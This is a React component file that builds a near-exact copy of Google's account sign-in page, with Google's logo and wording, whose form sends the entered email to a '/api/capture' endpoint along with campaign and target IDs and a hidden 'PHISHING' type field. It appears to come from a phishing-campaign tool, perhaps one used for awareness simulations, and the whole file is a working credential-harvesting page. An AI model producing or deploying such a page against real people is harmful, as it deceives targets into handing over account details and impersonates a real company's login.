'use client';

import React, { useState } from 'react';

export default function GoogleLogin({ campaignId, targetId }: { campaignId: string, targetId: string }) {
  const [email, setEmail] = useState('');

  // Minimal implementation mirroring Google account login step 1
  return (
    <div style={{ fontFamily: 'Roboto, Arial, sans-serif', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', backgroundColor: '#f0f4f9', paddingTop: '10vh' }}>
      <div style={{ background: '#fff', borderRadius: '8px', padding: '40px', width: '100%', maxWidth: '448px', boxSizing: 'border-box' }}>
        <div style={{ textAlign: 'center', marginBottom: '16px' }}>
          {/* Google Logo */}
          <svg viewBox="0 0 74 24" width="74" height="24" xmlns="http://www.w3.org/2000/svg">
            <path d="M9.4 18.6A9.6 9.6 0 0 1 0 9.3 9.6 9.6 0 0 1 9.4 0c2.6 0 4.8.9 6.5 2.5l-2.4 2.4A5.5 5.5 0 0 0 9.4 3.5c-3.1 0-5.7 2.6-5.7 5.8s2.6 5.8 5.7 5.8c3.6 0 5-2.5 5.2-3.8H9.4v-3.3h8.7c.1.5.2 1.2.2 1.9 0 4.3-2.9 7.4-6.9 7.4Z" fill="#4285f4"/>
            <path d="M22 6c3 0 5.4 2.3 5.4 5.3S25 16.7 22 16.7c-3 0-5.4-2.3-5.4-5.3S19 6 22 6Zm0 8.5c1.8 0 3.2-1.4 3.2-3.2S23.8 8.1 22 8.1c-1.8 0-3.2 1.4-3.2 3.2s1.4 3.2 3.2 3.2Z" fill="#ea4335"/>
            <path d="M34 6c3 0 5.4 2.3 5.4 5.3s-2.4 5.4-5.4 5.4c-3 0-5.4-2.3-5.4-5.3S31 6 34 6Zm0 8.5c1.8 0 3.2-1.4 3.2-3.2s-1.4-3.2-3.2-3.2c-1.8 0-3.2 1.4-3.2 3.2s1.4 3.2 3.2 3.2Z" fill="#fbbc05"/>
            <path d="M46 6.3v10.1c0 4.1-2.2 5.8-4.5 5.8-2.3 0-3.6-1.5-4.1-2.8l2-1c.3.8.9 1.6 2.1 1.6 1.4 0 2.2-.9 2.2-2.5v-1h-.1c-.4.5-1.2 1.2-2.3 1.2-2.2 0-4.3-2-4.3-5.4s2-5.4 4.3-5.4c1.1 0 1.9.7 2.3 1.2h.1V6.3H46Zm-2.2 8.2c1.4 0 2.4-1.2 2.4-3.2s-1-3.2-2.4-3.2c-1.3 0-2.5 1.2-2.5 3.2s1.1 3.2 2.5 3.2Z" fill="#4285f4"/>
            <path d="M50 16.4V.5h2.2v15.9H50Z" fill="#34a853"/>
            <path d="M60.4 14.5l1.8 1.2c-.6.9-1.9 3-4.9 3-3.1 0-5.4-2.4-5.4-5.4s2.3-5.4 5.2-5.4c2.8 0 4.6 1.9 5.2 2.9l.2.6-6.1 2.6c.5 1.1 1.3 1.7 2.6 1.7 1.2 0 2-.6 2.5-1.2Zm-3.1-4l4.2-1.7-.1-.3c-.3-.8-1.1-1.4-2.2-1.4-1.2 0-2.2.9-1.9 3.4Z" fill="#ea4335"/>
          </svg>
        </div>
        <h1 style={{ fontWeight: 400, fontSize: '24px', margin: '0 0 10px', textAlign: 'center' }}>Sign in</h1>
        <p style={{ margin: '0 0 35px', textAlign: 'center', fontSize: '16px' }}>Use your Google Account</p>
        
        <form method="POST" action="/api/capture" style={{ display: 'flex', flexDirection: 'column' }}>
          <input type="hidden" name="campaignId" value={campaignId} />
          <input type="hidden" name="targetId" value={targetId} />
          <input type="hidden" name="type" value="PHISHING" />

          <div style={{ position: 'relative', marginBottom: '35px' }}>
            <input 
              type="email" 
              name="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              style={{
                width: '100%',
                padding: '13px 15px',
                border: '1px solid #dadce0',
                borderRadius: '4px',
                fontSize: '16px',
                outline: 'none'
              }}
              placeholder="Email or phone"
            />
          </div>
          
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <a href="#" style={{ color: '#0b57d0', textDecoration: 'none', fontWeight: 500, fontSize: '14px' }}>Forgot email?</a>
            <button 
              type="submit" 
              style={{
                background: '#0b57d0',
                color: '#fff',
                border: 'none',
                borderRadius: '40px',
                padding: '10px 24px',
                fontSize: '14px',
                fontWeight: 500,
                cursor: 'pointer'
              }}
            >
              Next
            </button>
          </div>
        </form>
      </div>
      <div style={{ marginTop: '20px', width: '100%', maxWidth: '448px', display: 'flex', justifyContent: 'flex-start', fontSize: '12px', color: '#444746' }}>
        <div style={{ marginRight: 'auto' }}>English (United States)</div>
        <div style={{ display: 'flex', gap: '20px' }}>
          <a href="#" style={{ color: '#444746', textDecoration: 'none' }}>Help</a>
          <a href="#" style={{ color: '#444746', textDecoration: 'none' }}>Privacy</a>
          <a href="#" style={{ color: '#444746', textDecoration: 'none' }}>Terms</a>
        </div>
      </div>
    </div>
  );
}
